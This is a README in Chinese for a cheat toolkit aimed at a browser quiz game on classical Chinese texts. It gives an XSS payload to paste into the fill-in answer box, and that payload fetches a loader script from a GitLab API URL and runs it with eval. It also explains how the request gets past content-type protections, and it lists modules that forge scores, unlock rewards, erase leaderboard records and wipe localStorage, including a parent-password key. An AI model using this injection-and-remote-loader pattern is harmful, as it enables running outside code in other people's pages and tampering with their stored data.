# fuulea_hack

《文言诗文·课下注释闯关》的单文件页面补丁集。每个功能一个独立脚本，由 `loader.js` 拉起一个浮动面板按需加载。

## 注入（最短）

贴进「注释填空」的输入框，随便答错提交：

```html
<img src=x onerror="fetch('https://gitlab.com/api/v4/projects/88543905/repository/files/loader.js/raw?ref=main').then(r=>r.text()).then(eval)">
```

面板会出现在右下角，再点一次注入收起。

> 为什么走 `/api/v4/.../raw` 而不是 `/-/raw/`：GitLab 的 `/-/raw/` 返回 `text/plain` + `nosniff`，`<script>` 标签拒执行；API 版带 `Access-Control-Allow-Origin: *`，所以 `fetch` + `eval` 可用。

## 功能

| 按钮 | 文件 | 作用 |
|---|---|---|
| 💰 积分 | `mods/score.js` | 设 `score` + `earned`（两个一起改才生效） |
| 🐾 灵宠 | `mods/pets.js` | 数量（≤4）、种类（fox/qilin/cat/dog）、名字 |
| 🔓 解锁4只 | `mods/unlock.js` | 补满填空题进度 + 积分到 5400 |
| ✏️ 改名 | `mods/rename.js` | 清玩家名 / 灵宠名 / 排行榜里的旧记录 |
| 🧹 清答案 | `mods/clean.js` | 删错题本里存的答题原文 `yourAns` |
| 🖼 图片 | `mods/img.js` | 直链图片全屏弹窗 |
| 🌐 网页 | `mods/embed.js` | 网址 iframe 弹窗（受对方 X-Frame-Options 限制） |
| 📦 存档 | `mods/dump.js` | 展示并复制完整 `state` JSON |
| 💣 清空 | `mods/reset.js` | 清 `wycg_v3` + `wycg_rank_v1` |

## 存档结构

```js
{
  score, earned,                                  // 顶栏数字 / 灵宠等级依据
  pets: [{ sp, name, pts }],                      // sp ∈ fox|qilin|cat|dog，pts 是旧字段
  wrong: { "fill:123": { ...q, yourAns, correct } },
  fav:   { "note:456": { ...q } },
  fillDone: { "123": 1 },
  name, history: [{ ts, mode, total, correct, gain, items }]
}
```

`localStorage` 键：`wycg_v3`（学习数据）、`wycg_rank_v1`（排行榜）、`wycg_lock_v1`（家长密码）。

## 注意

- 面板脚本运行在页面上下文，能读写全部 localStorage。
- GitLab API 的 raw 有缓存，改了文件加 `&t=` 时间戳即可绕过（loader 里已经带上）。
- 各模块用 `prompt()` 交互，改到一半取消不会写入。
